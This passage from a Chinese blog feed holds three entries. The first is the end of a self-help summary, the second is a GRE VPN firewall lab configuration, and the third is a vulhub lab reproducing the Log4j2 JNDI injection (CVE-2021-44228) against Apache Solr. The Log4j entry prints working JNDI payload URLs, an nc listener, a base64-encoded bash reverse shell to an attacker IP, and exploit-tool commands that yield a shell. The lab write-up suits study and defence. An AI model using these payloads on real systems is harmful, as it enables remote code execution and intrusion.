title="勇于承担责任"></a>勇于承担责任</h3><p>让自己变得成熟的第一步就是勇于承担责任。我们都早已摆脱了自己跌倒将责任推给桌椅的孩童时代，我们应该勇敢地面对人生，学会对自己负责。</p><p>一个希望自己变得成熟的人一定要记得，对自己的所作所为负责，勇于承担责任，而不是寻找借口</p><h3 id="拥有坚定的信念"><a href="#拥有坚定的信念" class="headerlink" title="拥有坚定的信念"></a>拥有坚定的信念</h3><p>除了勇于承担责任之外，我们还要拥有坚定的信念，否则所有的理论都将化为泡影</p><p>我们的信念是否能够发挥作用，关键不在于如何去想而是如何去做。基督耶曾说：“观其果而知其因”，重要的是如何去做。</p><p>如果我们不采取行动的话，再坚定的信念也会毫无作用，我们的生活会充满虚伪，变得不再真实。因此，如果我们拥有坚定的信念，便认真地做好每一件事。</p><h3 id="做独一无二的自己"><a href="#做独一无二的自己" class="headerlink" title="做独一无二的自己"></a>做独一无二的自己</h3><p>每个人都是独一无二的，虽然构成人体的基因相同，但每个人的生命都是独成一体，各不相同</p><p>每天都要为自己创造一段独处的时光，抛弃所有的事物，拒接所有的电话，这是我们探索自己、了解自己必须要做的事情。</p><p>只有了解了自己，才能更好地了解别人</p><p>一 、在独处中认识自己<br>随着生活节奏的加快，我们能够沉思的时间越来越少了。在这种情况下，我们更应该给自己留出一些独处的时间，为自己创造反省的机会，以便进一步认识自己。当然，每个人都拥有自己的独处方式。</p><p>二、摆脱习惯的柳锁<br>我们都将自己理在了习惯和无聊的事物中，只有通过最大的努力才能挣脱出来</p><p>三、挖掘生活中令自己满意的东西<br>如果想要评价一个人的人格，最佳的时机是他处于最活跃、最满意的状态，这时他内心的想法是这才是真正的我。也就是说，当人们处于兴奋状态时，真正的自我就会浮现出来。</p><p>虽然一个人的个性难以改变，但可以通过某些行为表现出与众不同的特征。如果想要展示出真正的自我，便需要除掉内心深处的恐惧、缩、猜疑、迷茫、恶习等，而兴奋就是除掉这些东西的良药。</p><h3 id="学会喜欢自己"><a href="#学会喜欢自己" class="headerlink" title="学会喜欢自己"></a>学会喜欢自己</h3><p>我们要喜欢、尊重、欣赏自己，这不仅可以培养出健康成熟的个性，还可以提高我们人际交往的能力</p><p>如果想要获得进步、突出自我，就要及时纠正自己的错误，发挥自己的优点，展现出自己最优秀的一面。</p><p>在日常生活中，如果我们自己都不喜欢自己，那么很难期待别人会喜欢与我们在一起。</p><h3 id="坚持自我本色"><a href="#坚持自我本色" class="headerlink" title="坚持自我本色"></a>坚持自我本色</h3><p>尽可能站在他人的角度看待问题，但是千万不要因此就失去自己的观点。</p><p>每个人生命的真正意义，就是要把自身所具有的各种才能发挥出来</p><p>假如一个人完全顺从和超利避害的话，这个人就会变成奴。只有那些勇于接受生活挑战，投入到生活中去努力奋斗的人，才能获得真正的自由</p><h3 id="争取并珍爱友谊"><a href="#争取并珍爱友谊" class="headerlink" title="争取并珍爱友谊"></a>争取并珍爱友谊</h3><p>获得友谊的最好办法，就是注重给予，而不是收获</p><p>究竟用什么方法能够赢得别人的喜欢呢？答案其实很简单，那就是待人诚恳、热爱生活。</p><p>与人相处时，不要担心别人是否喜欢我们，而是要用心待人，培养能让别人喜欢你的品质</p><p>在这个世界上，每个人都有自己独立的人格，没有人会毫无缘由的喜欢你。你有什么特殊的理由让别人喜欢你，并与你成为朋友呢？</p><p> 无论是在生活中，还是在工作中，我们都必须端正自己的心态，不断地提升自已的人格魅力，这样才能使自己具备招人喜欢的特质和品行，才能赢得他人的关注和青睐。</p><p>中国的思想家孔子，曾经这样说过：“不惠人之不已知，惠不能也。意思是说，在生活中最重要的，并不是别人有没有爱我们，而是我们值不值得被别人爱。</p><p>假如你想要赢得别人的友谊或感情的话，没必要先担心别人是不是喜欢我们，而是应该不断提升自己值得别人喜欢的品质。</p><h2 id="8-如何让你的家庭变得幸福"><a href="#8-如何让你的家庭变得幸福" class="headerlink" title="8.如何让你的家庭变得幸福"></a>8.如何让你的家庭变得幸福</h2><h3 id="不要自掘婚姻的坟墓"><a href="#不要自掘婚姻的坟墓" class="headerlink" title="不要自掘婚姻的坟墓"></a>不要自掘婚姻的坟墓</h3><p>地狱中的魔鬼，发明了很多种毁灭爱情的烈火，其中喋喋不休是最致命的，它带给婚姻的永远只有悲剧</p><p>即便贵为一国之母，拥有全世界最美丽的面孔，也不要对自己的喋喋不休，这种只会给婚姻挖掘坟墓。</p><h3 id="不要用爱的名义改变对方"><a href="#不要用爱的名义改变对方" class="headerlink" title="不要用爱的名义改变对方"></a>不要用爱的名义改变对方</h3><p>一段成功的婚姻，不仅取决于你寻找的那个配偶，还取决于在这段婚姻中，你自已该如何做一个好的配偶。</p><p>假如你想拥有快乐的家庭生活，请记住，千万不要试图用爱的名义改造你的伴侣。</p><h3 id="不要批评家人"><a href="#不要批评家人" class="headerlink" title="不要批评家人"></a>不要批评家人</h3><p>50%以上婚姻失败的原因，就是那些无用的、令人心碎的批评。</p><p>不要对家人要求太刻，每当你想批评他们的时候，假装温柔一点，你会得到意想不到的效果</p><h3 id="真诚地欣赏对方"><a href="#真诚地欣赏对方" class="headerlink" title="真诚地欣赏对方"></a>真诚地欣赏对方</h3><p>在这个世界上，无论是男人还是女人，都渴望得到别人的赞赏和热爱。假如对方能够衷心地表示赞赏和热爱的话，他就会得到幸福和快乐</p><p>请男人们记住，男人真诚的赞美会使女人获得安全感得到心理的满足，所以她们对干那些称赞过自己的男士的印象最为深刻</p><p>请所有的女士记住，你的丈夫无论长得美丑、事业是否成功，他都希望自己在你眼里是最棒的，你的赞美就是赢得他内心的关键。</p><h3 id="细微之处见真情"><a href="#细微之处见真情" class="headerlink" title="细微之处见真情"></a>细微之处见真情</h3><p>很多男人总是不注意日常生活中的一些小事，因为他们不知道这些小事能够体现出他们对女人的体贴，而往往爱的远进，都是从一些细微的地方开始的。</p><p>为什么一定要等到你的妻子生病住院了，你才给她买花呢？为什么不在明天晚上就买一束玫瑰花送给她呢？如果你愿意的话，不立即去做，看看结果会如何</p><p>婚姻是由一连串的项事组成的，如果忽略了这个事实的话，就将会造成家庭生活的灾难。</p><h3 id="家庭内部也应有礼"><a href="#家庭内部也应有礼" class="headerlink" title="家庭内部也应有礼"></a>家庭内部也应有礼</h3><p>礼貌是一种品质，它可以弥补服饰和外在的缺陷。</p><p>在个人的幸福快乐方面，婚姻要比世界更加重要，更加切身。</p><p>不讲道理就像是吞爱情的癌细胞。我们每个人都知道这一点，但并不是每个人都能做到。大多情况下我们对待自的家人， 却不及对待陌生人那样有礼貌</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;人性的弱点&quot;&gt;&lt;a href=&quot;#人性的弱点&quot; class=&quot;headerlink&quot; title=&quot;人性的弱点&quot;&gt;&lt;/a&gt;人性的弱点&lt;/h1&gt;&lt;h2 id=&quot;1-与人相处的基本技巧&quot;&gt;&lt;a href=&quot;#1-与人相处的基本技巧&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GRE VPN配置</title>
    <link href="https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/"/>
    <id>https://w-sqrt7.github.io/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/</id>
    <published>2024-05-27T10:23:30.862Z</published>
    <updated>2024-06-16T08:01:11.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GRE-VPN配置"><a href="#GRE-VPN配置" class="headerlink" title="GRE VPN配置"></a>GRE VPN配置</h1><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><p><img src="/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527183724828.png" alt="image-20240527183724828"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先配置pc的ip子网掩码和网关</p><p>2.然后开始对防火墙进行配置，配端口ip</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW1]int g1/0/0</span><br><span class="line">[FW1-GigabitEthernet1/0/0]ip address 192.168.0.254 24</span><br><span class="line">[FW1-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW1]int g1/0/1</span><br><span class="line">[FW1-GigabitEthernet1/0/1]ip address 202.0.0.1 24</span><br><span class="line">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW2]int g1/0/0</span><br><span class="line">[FW2-GigabitEthernet1/0/0]ip address 192.168.1.254 24</span><br><span class="line">[FW2-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW2]int g1/0/1</span><br><span class="line">[FW2-GigabitEthernet1/0/1]ip address 202.0.0.2 24</span><br><span class="line">[FW2-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><p>这里开始把tunnel隧道也配置好</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW1]int Tunnel 0</span><br><span class="line">[FW1-Tunnel0]ip address 172.16.10.1 24</span><br><span class="line">[FW1-Tunnel0]tunnel-protocol gre</span><br><span class="line">[FW1-Tunnel0]source 202.0.0.1</span><br><span class="line">[FW1-Tunnel0]destination 202.0.0.2</span><br><span class="line">[FW1-Tunnel0]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW2]int Tunnel 0</span><br><span class="line">[FW2-Tunnel0]ip address 172.16.10.2 24</span><br><span class="line">[FW2-Tunnel0]tunnel-protocol gre</span><br><span class="line">[FW2-Tunnel0]source 202.0.0.2</span><br><span class="line">[FW2-Tunnel0]destination 202.0.0.1</span><br><span class="line">[FW2-Tunnel0]quit</span><br></pre></td></tr></table></figure><p>然后配置安全区域</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[FW1]firewall zone trust </span><br><span class="line">[FW1-zone-trust]add interface g1/0/0</span><br><span class="line">[FW1-zone-trust]quit</span><br><span class="line">[FW1]firewall zone untrust </span><br><span class="line">[FW1-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW1-zone-untrust]quit</span><br><span class="line"></span><br><span class="line">[FW1]firewall zone dmz </span><br><span class="line">[FW1-zone-dmz]add interface Tunnel 0</span><br><span class="line">[FW1-zone-dmz]quit</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[FW2]firewall zone trust </span><br><span class="line">[FW2-zone-trust]add interface g1/0/0</span><br><span class="line">[FW2-zone-trust]quit</span><br><span class="line">[FW2]firewall zone untrust </span><br><span class="line">[FW2-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW2-zone-untrust]quit</span><br><span class="line"></span><br><span class="line">[FW2]firewall zone dmz </span><br><span class="line">[FW2-zone-dmz]add interface Tunnel 0</span><br><span class="line">[FW2-zone-dmz]quit</span><br></pre></td></tr></table></figure><p>然后配置防火墙的静态路由</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[FW1]ip route-static 192.168.1.0 24 Tunnel 0</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[FW2]ip route-static 192.168.0.0 24 Tunnel 0</span><br></pre></td></tr></table></figure><p>最后就是配置三条安全策略</p><p>FW1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[FW1-policy-security]display this</span><br><span class="line">2024-05-27 11:10:27.880 </span><br><span class="line">#</span><br><span class="line">security-policy</span><br><span class="line"> rule name gre1</span><br><span class="line">  source-zone trust</span><br><span class="line">  destination-zone dmz</span><br><span class="line">  source-address 192.168.0.0 mask 255.255.255.0</span><br><span class="line">  destination-address 192.168.1.0 mask 255.255.255.0</span><br><span class="line">  action permit</span><br><span class="line"> rule name gre2</span><br><span class="line">  source-zone dmz</span><br><span class="line">  destination-zone trust</span><br><span class="line">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class="line">  destination-address 192.168.0.0 mask 255.255.255.0</span><br><span class="line">  action permit</span><br><span class="line"> rule name gre3</span><br><span class="line">  source-zone local</span><br><span class="line">  source-zone untrust</span><br><span class="line">  destination-zone local</span><br><span class="line">  destination-zone untrust</span><br><span class="line">  service gre</span><br><span class="line">  action permit</span><br><span class="line">#</span><br><span class="line">return</span><br></pre></td></tr></table></figure><p>FW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[FW2-policy-security]display this</span><br><span class="line">2024-05-27 11:14:21.890 </span><br><span class="line">#</span><br><span class="line">security-policy</span><br><span class="line"> rule name gre1</span><br><span class="line">  source-zone trust</span><br><span class="line">  destination-zone dmz</span><br><span class="line">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class="line">  destination-address 192.168.0.0 mask 255.255.255.0</span><br><span class="line">  action permit</span><br><span class="line"> rule name gre2</span><br><span class="line">  source-zone dmz</span><br><span class="line">  destination-zone trust</span><br><span class="line">  source-address 192.168.0.0 mask 255.255.255.0</span><br><span class="line">  destination-address 192.168.1.0 mask 255.255.255.0</span><br><span class="line">  action permit</span><br><span class="line"> rule name gre3</span><br><span class="line">  source-zone local</span><br><span class="line">  source-zone untrust</span><br><span class="line">  destination-zone local</span><br><span class="line">  destination-zone untrust</span><br><span class="line">  service gre</span><br><span class="line">  action permit</span><br><span class="line">#</span><br><span class="line">return</span><br></pre></td></tr></table></figure><p>至此便完成了GRE VPN的配置，然后进行测试，不同内网中的主机是可以相互通信的，同样可以wireshark抓包进行查看</p><p><img src="/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/image-20240527191751145.png" alt="image-20240527191751145"></p><p><img src="/2024/05/27/eNSP/GRE-VPN%E9%85%8D%E7%BD%AE/Screenshot_20240603_205336_net.csdn.csdnplus.jpg" alt="Screenshot_20240603_205336_net.csdn.csdnplus"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GRE-VPN配置&quot;&gt;&lt;a href=&quot;#GRE-VPN配置&quot; class=&quot;headerlink&quot; title=&quot;GRE VPN配置&quot;&gt;&lt;/a&gt;GRE VPN配置&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图：&quot;&gt;&lt;a href=&quot;#实验拓扑图：&quot; class=&quot;head</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub】Log4j2漏洞复现</title>
    <link href="https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://w-sqrt7.github.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-26T03:14:31.558Z</published>
    <updated>2024-05-26T10:58:04.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【vulhub】Log4j2漏洞复现"><a href="#【vulhub】Log4j2漏洞复现" class="headerlink" title="【vulhub】Log4j2漏洞复现"></a>【vulhub】Log4j2漏洞复现</h1><h2 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h2><p>log4j是Apache的一个开源项目，是一个基于Java的日志记录框架。Log4j2是log4j的后继者，被大量用于业务系统开发，记录日志信息。</p><p>log4j2 中存在JNDI注入漏洞，Log4j2 组件在开启了日志记录功能后，凡是在可触发错误记录日志的地方，插入漏洞利用代码，即可利用成功。特殊情况下，若该组件记录的日志包含其他系统的记录日志，则有可能造成间接投毒。通过中间系统，使得组件间接读取了具有攻击性的漏洞利用代码，亦可间接造成漏洞触发。</p><p>同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink、Tomcat、Weblogic、ES、Redis等</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI 是 Java Naming and Directory Interface 的缩写，是 Java 中用于访问各种命名和目录服务的API（应用程序编程接口）。JNDI 提供了一种标准的方式来访问各种命名和目录服务，相当于一个用于映射的字典，从指定的远程服务器获取并加载对象，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p><p>其中常用的协议包括 RMI（远程方法调用）和 LDAP（轻量目录访问协议）。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务，以LDAP服务为例进行复现。</p><h2 id="lookup："><a href="#lookup：" class="headerlink" title="lookup："></a>lookup：</h2><p>log4j2框架下的lookup查询服务是一种查找机制，用于动态获取和替换日志记录中的变量或属性的值，提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。</p><p>攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序，造成了远程代码执行。</p><p>log4j中除了sys解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。</p><h2 id="LDAP："><a href="#LDAP：" class="headerlink" title="LDAP："></a>LDAP：</h2><p>LDAP(轻型目录访问协议)是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p><h2 id="RMI："><a href="#RMI：" class="headerlink" title="RMI："></a>RMI：</h2><p>RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>如一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p><p><strong>影响版本</strong></p><p>Apache Log4j 2.x &lt;&#x3D; 2.14.1 &lt;&#x3D; Log4j 2.15.0-rc1</p><h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者构造payload，在JNDI接口lookup查询进行注入，payload为${jndi:ldap:恶意url&#x2F;poc}，JNDI会去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源，由于lookup的出栈没做限制，最终指向了攻击者部署好的恶意站点，下载了远程的恶意class，最终造成了远程代码执行rce。</p><p><strong>详细过程分析：</strong></p><p>log4j2 框架下的 lookup 查询服务提供了 {} 字段解析功能，传进去的值会被直接解析。</p><p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p><p><strong>RMI</strong></p><blockquote><p>假如日志中含有该语句${jndi:&#x2F;&#x2F;rmi:服务器地址&#x2F;Exploit}</p><p>被攻击服务器发现要输出的信息中有 ${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</p><p>RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</p><p>被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</p><p>被攻击服务器下载恶意class文件并执行其中的恶意代码。</p></blockquote><p><strong>LDAP</strong></p><blockquote><p>假如日志中含有该语句${jndi:ldap:192.168.100.131:5555&#x2F;exp}</p><p>被攻击服务器发现要输出的信息中有 ${}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099&#x2F;exp</p><p>解析到ldap，就会去192.168.61.129:1099的ldap服务找名为exp的资源，如果找不到就会去http服务中找，在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入攻击者就可以通过shell实现任意的命令执行，造成严重危害</p></blockquote><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20124201.png" alt="屏幕截图 2024-05-26 124201"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先要找到注入点，尝试传入参数，&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p><p>利用DNSlog平台进行漏洞验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://xyzq33.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xyzq33.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163239058.png" alt="image-20240526163239058"></p><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163300422.png" alt="image-20240526163300422"></p><p>可以发现回显验证成功，即存在漏洞，然后尝试进行漏洞利用，获取shell。</p><h3 id="法一：JNDI注入工具"><a href="#法一：JNDI注入工具" class="headerlink" title="法一：JNDI注入工具"></a>法一：JNDI注入工具</h3><p><strong>工具一：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</strong></p><p>在攻击机上nc开启端口监听，等待shell反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526164651028.png" alt="image-20240526164651028"></p><p>利用JNDI注入工具，开启相对应的LDAP或RMI服务，-A为开启LDAP服务的服务器ip，这里我用的是攻击机的IP，即模拟kali不仅是LDAP服务器，也是用于反弹获取shell的服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,[经过base64编码后的命令]&#125;|&#123;base64,-d&#125;|bash&quot; -A [vps ip]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class="line">base64编码后:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot; -A 192.168.100.131</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20165326.png" alt="屏幕截图 2024-05-26 165326"></p><p>根据上方工具生成的进行payload构造并请求，可以获取到shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/hk5uoj&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165653255.png" alt="image-20240526165653255"></p><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165835051.png" alt="image-20240526165835051"></p><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165912073.png" alt="image-20240526165912073"></p><p><strong>工具二：JNDIExploit-1.4-SNAPSHOT.jar</strong></p><p>攻击机同样需要先开启nc监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><p>然后使用工具开启LDAP服务，-i 后面加上对应的ip，可-h查看具体用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.100.131</span><br></pre></td></tr></table></figure><p>构造payload并请求，将shell反弹到攻击机对应ip和端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Basic/ReverseShell/192.168.100.131/7777&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170913873.png" alt="image-20240526170913873"></p><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170948245.png" alt="image-20240526170948245"></p><p><img src="/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526171004217.png" alt="image-20240526171004217"></p><h3 id="法二：编写恶意文件"><a href="#法二：编写恶意文件" class="headerlink" title="法二：编写恶意文件"></a>法二：编写恶意文件</h3><p>首先编写bash命令，并开启nc监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 